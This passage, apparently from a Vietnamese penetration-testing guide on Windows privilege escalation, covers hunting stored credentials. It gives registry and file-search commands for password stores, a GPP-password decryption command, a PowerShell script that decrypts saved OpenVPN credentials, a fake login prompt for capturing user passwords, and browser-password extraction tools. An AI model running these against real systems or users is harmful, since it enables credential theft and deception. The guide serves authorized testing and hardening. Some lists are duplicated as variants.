cập có đặc quyền cao hơn. Hạn chế ACL của thư mục dữ liệu và tránh commit bí mật vào các thay đổi trong build.

### Xoay vòng mật khẩu quản trị viên cục bộ tùy chỉnh

Một công cụ xoay vòng mật khẩu tự viết có thể lưu mật khẩu quản trị viên cục bộ đã mã hóa trong một service cục bộ, đồng thời giữ thông tin xác thực datastore trong tệp `.env` có thể đọc được hoặc bên cạnh binary cập nhật. Hãy rà soát cùng lúc scheduled task, tài khoản, ACL cấu hình, listener và quyền datastore của công cụ cập nhật. Datastore chỉ lắng nghe trên loopback vẫn có thể được người dùng cục bộ truy cập nếu họ có thông tin xác thực hợp lệ, nhưng chỉ xác thực thành công không chứng minh rằng họ có quyền đọc các bản ghi liên quan. Nếu seed mã hóa hoặc key material có thể truy cập được bên cạnh ciphertext, hãy rà soát chính xác cách dẫn xuất key trước khi tin cậy vào cơ chế mã hóa. Một phương pháp xác định AES key từ seed bị lộ bằng Go [`math/rand`](https://pkg.go.dev/math/rand) không phù hợp để bảo vệ mật khẩu đó; Go ghi rõ package này không phù hợp với tính ngẫu nhiên nhạy cảm về bảo mật. Hãy xác nhận mọi mật khẩu khôi phục được vẫn còn hiệu lực và thuộc về tài khoản trong nhóm Administrators cục bộ trước khi coi đó là một đường dẫn leo thang đặc quyền. Scheduled task, đường dẫn `.env` hoặc blob đã mã hóa tự chúng không chứng minh được bất kỳ điều kiện nào trong số đó. Không đưa mật khẩu và key material vào đầu ra liệt kê thông thường.

Dùng [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) để quản lý mật khẩu quản trị viên cục bộ. Cơ chế lưu trữ dựa trên directory hoặc Entra cùng các biện pháp kiểm soát truy cập của nó khác với datastore cục bộ tùy chỉnh; tương tự, [các role của Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) quyết định liệu người dùng datastore đã xác thực có thể đọc một index cụ thể hay không.

### Archive plugin Java server và việc dùng lại thông tin xác thực

Một số plugin Java server được phân phối dưới dạng JAR archive trong thư mục `plugins` của server. Plugin tùy chỉnh có thể đọc được có thể chứa cấu hình hoặc bytecode với thông tin xác thực service được nhúng. Chỉ rà soát archive khi được cấp quyền và không đưa bí mật đã khôi phục vào đầu ra liệt kê thông thường. Chỉ riêng đường dẫn plugin không chứng minh rằng có bí mật, và mật khẩu service đã khôi phục chỉ dẫn đến đặc quyền cao hơn nếu nó cũng hợp lệ với một tài khoản có đặc quyền cao hơn. Kiểm tra ACL của các tệp liên quan và thay thông tin xác thực dùng lại bằng các bí mật riêng biệt. Xem [hướng dẫn cài đặt plugin của PaperMC](https://docs.papermc.io/paper/adding-plugins/) để biết bố cục thư mục và [tài liệu JAR của Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) để biết nội dung archive.

### Thông tin xác thực của cơ sở dữ liệu nhúng Openfire

Một bản cài đặt Openfire dùng cơ sở dữ liệu nhúng có thể lưu `openfire.script` trong `Openfire\embedded-db`. Nếu tài khoản hiện tại có thể đọc tệp này, hãy rà soát các bản ghi `OFUSER` và thuộc tính `passwordKey` cùng nhau. [Tài liệu về user-provider](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) của Openfire cho biết mật khẩu có thể được lưu dưới dạng văn bản thuần hoặc được mã hóa bằng key lưu trong thuộc tính đó. Mật khẩu đã khôi phục chỉ có ý nghĩa đối với việc leo thang đặc quyền nếu nó vẫn còn hiệu lực với một danh tính có đặc quyền cao hơn; chỉ riêng tên tệp không chứng minh được quyền đọc hay việc dùng lại thông tin xác thực. Đường dẫn này chỉ là gợi ý để kiểm kê, vì vậy không đưa nội dung cơ sở dữ liệu và thông tin xác thực vào đầu ra liệt kê thông thường.

Tệp riêng `Openfire\conf\openfire.xml` có thể tiết lộ các cổng đã cấu hình và interface bind của admin console ngay cả khi đang dùng cơ sở dữ liệu bên ngoài. Openfire thường bind admin console vào loopback; tài khoản cục bộ vẫn có thể truy cập địa chỉ đó nếu listener đang chạy. Hãy kiểm tra đồng thời listener thực tế, role admin được cấp quyền, chính sách tải lên plugin và danh tính của Openfire service. Admin có thể cài đặt plugin có thể khiến mã plugin chạy trong context của service; điều này có thể mang đặc quyền rất cao nếu service chạy dưới quyền LocalSystem. Chỉ riêng mật khẩu tài khoản khớp hoặc đường dẫn cấu hình có thể đọc được không chứng minh quyền truy cập admin console hay khả năng thực thi mã. Xem [hướng dẫn cài đặt và quản lý plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) và [thuộc tính API tải lên plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) của nhà cung cấp.

### Cấu hình máy chủ quản lý pháp chứng

Cấu hình máy chủ Velociraptor, thường có tên `server.config.yaml`, có thể chứa `CA.private_key` của CA nội bộ. Nếu người dùng có đặc quyền thấp hơn có thể đọc key đó, họ có thể tạo chứng chỉ client API. Việc này có dẫn đến đặc quyền cao hơn hay không phụ thuộc vào role người dùng trên server, khả năng truy cập API và danh tính mà server hoặc agent mục tiêu sử dụng để thực thi. Cấu hình client chứa dữ liệu khác; tìm thấy một cấu hình như vậy không chứng minh được quyền truy cập CA của server. Một số bản triển khai giữ private key của CA ngoại tuyến, vì vậy cấu hình server có thể đọc được nhưng không có signing key.

Trên Windows server, hãy kiểm tra ACL của cấu hình **server** trong thư mục cài đặt và mọi bản sao lưu được bảo vệ. Một vị trí có thể có là `%ProgramFiles%\VelociraptorServer\server.config.yaml`; nếu khác, hãy dùng đường dẫn đã cấu hình cho service. Xác nhận danh tính hiện tại có thể đọc tệp và `CA.private_key` thực sự tồn tại. Tránh in private key vào log hoặc đầu ra liệt kê. Quy trình `config api_client` của nhà cung cấp dùng CA key để cấp client certificate, nhưng cũng cần có role hiệu lực ở phía server; việc tạo hoặc thay đổi role có thể đòi hỏi quyền ghi datastore hoặc khởi động lại. Một danh tính server có đặc quyền sẵn có có thể tạo ra đường truy cập ngay cả khi không thể ghi các thay đổi đó. Các truy vấn API có quyền thực thi sẽ chạy trong context liên quan của server hoặc agent, có thể mang đặc quyền rất cao.

Bảo vệ cấu hình server và bản sao lưu bằng ACL hạn chế, giữ CA signing key ngoại tuyến nếu có thể, đồng thời giới hạn role API và quyền truy cập listener. Xem [tài liệu API Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) và [hướng dẫn cấu hình bảo mật](https://docs.velociraptor.app/docs/deployment/security/).

### Thông tin xác thực PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY là một trình quản lý phiên riêng. Kho lưu trữ được mã hóa gốc của ứng dụng có thể nằm tại `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, trong khi bản sao lưu phiên đã xuất có thể mang tên `sessions-backup.dat` và được lưu ở nơi khác. [Hướng dẫn xuất của SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) cho biết các bản xuất được mã hóa bằng mật khẩu và có thể chứa phiên, khóa, script, thẻ và các mối quan hệ; [diễn đàn hỗ trợ](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) của hãng xác định vị trí kho lưu trữ gốc. Trước tiên, hãy kiểm tra quyền truy cập và đường dẫn tệp. Việc tìm thấy một trong hai tệp này không tiết lộ mật khẩu hoặc chứng minh rằng thông tin xác thực đã lưu còn hợp lệ hay có quyền cao hơn.

### Khóa máy chủ SSH của PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH keys trong registry

SSH private keys có thể được lưu trong registry key `HKCU\Software\OpenSSH\Agent\Keys`, vì vậy bạn nên kiểm tra xem trong đó có gì đáng chú ý không:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Nếu bạn tìm thấy bất kỳ mục nào trong đường dẫn đó, thì đó có thể là SSH key đã lưu. Key được mã hóa nhưng có thể dễ dàng giải mã bằng [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Tìm hiểu thêm về kỹ thuật này tại đây: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Nếu dịch vụ `ssh-agent` không chạy và bạn muốn dịch vụ tự động khởi động khi boot, hãy chạy:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Có vẻ kỹ thuật này không còn hiệu quả. Tôi đã thử tạo một số SSH key, thêm chúng bằng `ssh-add` rồi đăng nhập vào máy qua SSH. Registry `HKCU\Software\OpenSSH\Agent\Keys` không tồn tại và procmon không phát hiện việc sử dụng `dpapi.dll` trong quá trình xác thực bằng khóa bất đối xứng.

### Tệp cài đặt không giám sát

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Bạn cũng có thể tìm kiếm các tệp này bằng **metasploit**: _post/windows/gather/enum_unattend_

Nội dung ví dụ:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Bản sao lưu SAM & SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Các tệp sao lưu Windows Imaging (`.wim`) có thể đọc được cũng có thể chứa các hive `SAM`, `SECURITY` và `SYSTEM` ngoại tuyến. Ưu tiên kiểm tra các thư mục sao lưu hoặc image có thể truy cập cục bộ, đồng thời xem **tên các mục bên trong** image trước khi trích xuất bất kỳ thứ gì; chỉ riêng tên tệp `.wim` không chứng minh rằng các hive bị lộ, và các image `install.wim`, `boot.wim` và recovery thông thường thường là những dấu hiệu gây hiểu nhầm. SMB share là một đường truy cập riêng và chỉ nên kiểm tra khi share đó nằm trong phạm vi. Xem hướng dẫn về [Windows image](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) và [tệp registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) của Microsoft.

### Thông tin xác thực đám mây

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Tìm tệp có tên **SiteList.xml**

### Cached GPP Password

Trước đây có một tính năng cho phép triển khai các tài khoản quản trị viên cục bộ tùy chỉnh trên một nhóm máy tính thông qua Group Policy Preferences (GPP). Tuy nhiên, phương pháp này có những lỗ hổng bảo mật nghiêm trọng. Thứ nhất, bất kỳ người dùng miền nào cũng có thể truy cập Group Policy Objects (GPO), được lưu dưới dạng tệp XML trong SYSVOL. Thứ hai, bất kỳ người dùng nào đã xác thực cũng có thể giải mã mật khẩu trong các GPP này, vốn được mã hóa bằng AES256 với một khóa mặc định được công bố rộng rãi. Điều này gây ra rủi ro nghiêm trọng vì có thể cho phép người dùng đạt được quyền cao hơn.

Để giảm thiểu rủi ro này, một hàm đã được phát triển để quét các tệp GPP được lưu trong bộ nhớ đệm cục bộ có chứa trường "cpassword" không rỗng. Khi tìm thấy tệp như vậy, hàm sẽ giải mã mật khẩu và trả về một đối tượng PowerShell tùy chỉnh. Đối tượng này bao gồm thông tin chi tiết về GPP và vị trí của tệp, giúp xác định và khắc phục lỗ hổng bảo mật này.

Tìm các tệp sau trong `C:\ProgramData\Microsoft\Group Policy\history` hoặc trong _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (trước Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Để giải mã cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Dùng crackmapexec để lấy mật khẩu:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Cấu hình Web IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Ví dụ về web.config có thông tin đăng nhập:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Các archive backup trong webroot của IIS

Một file ZIP backup cũ được đặt trực tiếp trong webroot đang được phục vụ có thể làm lộ các file cấu hình trước đây và thông tin xác thực có thể tái sử dụng. Hãy kiểm tra đường dẫn vật lý được cấu hình cho site và xác nhận archive có thực sự truy cập được qua HTTP hay không trước khi xem đây là một sự cố lộ dữ liệu. Đường dẫn mặc định `C:\inetpub\wwwroot` chỉ là một vị trí cần kiểm tra. Có thể kiểm kê nhanh trên máy để liệt kê tên và kích thước mà không cần mở các archive:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Tên tệp lưu trữ không chứng minh rằng nó chứa bí mật hoặc thông tin xác thực được khôi phục cấp quyền cao hơn.

### Thông tin xác thực OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Nhật ký

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Yêu cầu thông tin đăng nhập

Bạn luôn có thể **yêu cầu người dùng nhập thông tin đăng nhập của họ hoặc thậm chí thông tin đăng nhập của người dùng khác** nếu bạn nghĩ họ có thể biết (lưu ý rằng việc **trực tiếp yêu cầu** khách hàng cung cấp **thông tin đăng nhập** thực sự **rủi ro**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Tên tệp có thể chứa thông tin xác thực**

Các tệp đã biết từng chứa **mật khẩu** ở dạng **văn bản thuần** hoặc **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Biến thể danh sách tên tệp không có phần mở rộng Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Cơ sở dữ liệu Password Safe v3 thường dùng phần mở rộng `.psafe3`. Hãy xem tệp có tên khớp là một ứng viên vault được mã hóa; sự hiện diện của tệp không chứng minh rằng bạn có thể đọc, mở khóa hoặc sử dụng thông tin xác thực được lưu trong đó. Khi rà soát nơi lưu các tệp này, hãy kiểm tra những hồ sơ người dùng có thể truy cập và các thư mục gốc chia sẻ tệp đã được cấu hình.

Tệp KeePass `.kdbx` có thể đọc được cũng chỉ là dấu hiệu cho thấy có vault được mã hóa. Để mở khóa, cần có master password thực tế cùng mọi key file hoặc yếu tố tài khoản đã cấu hình. Nếu một cuộc rà soát được ủy quyền phát hiện cặp hash LM:NT trong một mục, hãy xác minh tài khoản được nêu và liệu NT hash đó còn hiện hành, được dịch vụ NTLM của mục tiêu chấp nhận hay không trước khi cân nhắc [pass-the-hash](../ntlm/README.md#pass-the-hash). Bản thân một mục trong vault không cấp quyền Administrator hay SYSTEM; quyền truy cập dịch vụ từ xa, quyền của tài khoản và mọi bước thực thi dịch vụ riêng biệt cũng phải được đáp ứng. Báo cáo kiểm kê nên nêu đường dẫn vault và khả năng đọc, không in cơ sở dữ liệu hoặc thông tin xác thực được lưu trữ.

Tìm kiếm tất cả các tệp được đề xuất sau:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Biến thể lệnh tìm kiếm không có phần mở rộng Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Thông tin xác thực trong Thùng rác

Bạn cũng nên kiểm tra Thùng rác để tìm thông tin xác thực bên trong.

Kiểm tra các mục trong Thùng rác mà bạn có thể truy cập để tìm bản sao lưu và kho lưu trữ cấu hình đã xóa, cũng như các tệp có tên nhắc rõ đến thông tin xác thực. Một bản sao lưu `.7z`, `.zip` hoặc `.rar` hữu ích có thể đã cũ vài tháng và có tên tệp bình thường. Windows lưu đường dẫn ban đầu và thời điểm xóa trong bản ghi `$I`, còn tệp đã xóa nằm trong mục `$R` tương ứng; hãy kiểm tra metadata và quyền đọc của danh tính hiện tại trước khi mở kho lưu trữ. Khả năng hiển thị phụ thuộc vào volume, SID người dùng và quyền tệp, nên danh sách trống không chứng minh rằng không có bản sao lưu nào có thể khôi phục. Hãy xem tên kho lưu trữ là một mục cần xem xét, chứ không phải bằng chứng rằng kho lưu trữ đó có chứa bí mật hợp lệ.

Một tệp `.pfx` đã xóa mà bạn có thể truy cập cũng có thể là manh mối về **ký mã**. Nếu tệp có chứa khóa riêng tư mà bạn có thể truy cập, khóa đó có thể ký một script PowerShell đã chỉnh sửa; [PowerShell yêu cầu chứng chỉ ký mã có khóa riêng tư](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), và [các quy tắc nhà phát hành của AppLocker đánh giá danh tính người ký và phạm vi quy tắc](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Việc thực thi giữa các tài khoản đòi hỏi danh tính hiện tại có thể chỉnh sửa đúng script đó, có quy tắc đang có hiệu lực chấp nhận chữ ký được tạo cho script và tài khoản đích, và có tác vụ đã lên lịch hoặc thành phần khác với quyền cao hơn thực sự chạy script. Chỉ riêng tên tệp `.pfx`, chủ thể chứng chỉ hoặc script có quyền ghi không đủ để xác lập chuỗi này. Hãy xem xét metadata, ACL, chính sách và lệnh được lên lịch trước khi mở dữ liệu khóa riêng tư hoặc kích hoạt tác vụ.

Ngoài ra, hãy xem xét các cơ sở dữ liệu hồ sơ ứng dụng nhắn tin, ghi chú và tệp đã nhận mà bạn có thể truy cập để tìm manh mối về thông tin xác thực. Bản xuất khóa khôi phục BitLocker có thể được lưu dưới dạng HTML hoặc TXT, đôi khi nằm trong một kho lưu trữ sao lưu có tên cụ thể. Những dữ liệu này có thể giúp truy cập một volume dữ liệu được mã hóa riêng biệt, chứa các bản sao lưu cũ hơn; chỉ kiểm tra volume và kho lưu trữ khi bạn được phép truy cập. Nếu bản sao lưu có chứa `NTDS.dit`, việc khôi phục thông tin xác thực domain ngoại tuyến cũng cần hive `SYSTEM` tương ứng, như mô tả trong [quy trình sao lưu và nhóm đặc quyền](../active-directory-methodology/privileged-groups-and-token-privileges.md). Chỉ riêng tên tệp và một volume bị khóa không chứng minh rằng có khóa khôi phục hoặc bản sao lưu domain có thể sử dụng được.

Để **khôi phục mật khẩu** đã lưu trong một số chương trình, bạn có thể dùng: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Bên trong registry

**Các khóa registry khác có thể chứa thông tin xác thực**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Trích xuất khóa openssh từ registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Lịch sử trình duyệt

Bạn nên kiểm tra các cơ sở dữ liệu lưu mật khẩu từ **Chrome hoặc Firefox**.\
Bạn nên kiểm tra các cơ sở dữ liệu lưu mật khẩu từ **Chrome, Edge hoặc Firefox**.\
Ngoài ra, hãy kiểm tra lịch sử, dấu trang và mục yêu thích của trình duyệt vì có thể **mật khẩu được** lưu ở đó.

Với profile **Default** thông thường của Edge cho người dùng hiện tại, `Login Data` nằm trong `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, còn `Local State` nằm trong thư mục cha `User Data`. [Microsoft tài liệu hóa vị trí profile mặc định](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); một profile khác hoặc chính sách `UserDataDir` có thể thay đổi vị trí này. Việc phát hiện tệp chỉ là dấu hiệu cho thấy có thể có nơi lưu thông tin xác thực: hãy xác nhận các tệp có thể đọc được, có ngữ cảnh DPAPI của người dùng tương ứng hoặc khóa khác được phép sử dụng, và thông tin đăng nhập đã lưu có thuộc về tài khoản có đặc quyền cao hơn hay không. Chỉ liệt kê đường dẫn thì không cần mở cơ sở dữ liệu hoặc in ra mật khẩu đã giải mã.

Với Firefox, [Mozilla tài liệu hóa](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) rằng `key4.db` và `logins.json` trong profile là cặp tệp khóa và thông tin đăng nhập được mã hóa. Sự hiện diện của chúng chỉ là dấu hiệu ban đầu: hãy kiểm tra xem cả hai tệp có đọc được hay không, có mục đã lưu hay không và khóa có được bảo vệ bằng Primary Password hay không trước khi kết luận rằng có thể sử dụng thông tin xác thực. Nếu thông tin xác thực khôi phục được thuộc về tài khoản domain, hãy xem xét riêng các quyền kiểm soát nhóm hiệu lực của tài khoản đó và quyền [đọc hoặc giải mã mật khẩu LAPS](../active-directory-methodology/laps.md) của nhóm; chỉ riêng dấu vết trong trình duyệt không chứng minh được có đường dẫn lên quyền quản trị.

Các công cụ trích xuất mật khẩu từ trình duyệt:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** là công nghệ được tích hợp trong hệ điều hành Windows, cho phép các thành phần phần mềm viết bằng những ngôn ngữ khác nhau **giao tiếp với nhau**. Mỗi thành phần COM được **định danh bằng class ID (CLSID)** và cung cấp chức năng thông qua một hoặc nhiều interface, được định danh bằng interface ID (IID).

Các lớp và interface COM được định nghĩa trong registry lần lượt tại **HKEY\CLASSES\ROOT\CLSID** và **HKEY\CLASSES\ROOT\Interface**. Registry này được tạo bằng cách hợp nhất **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

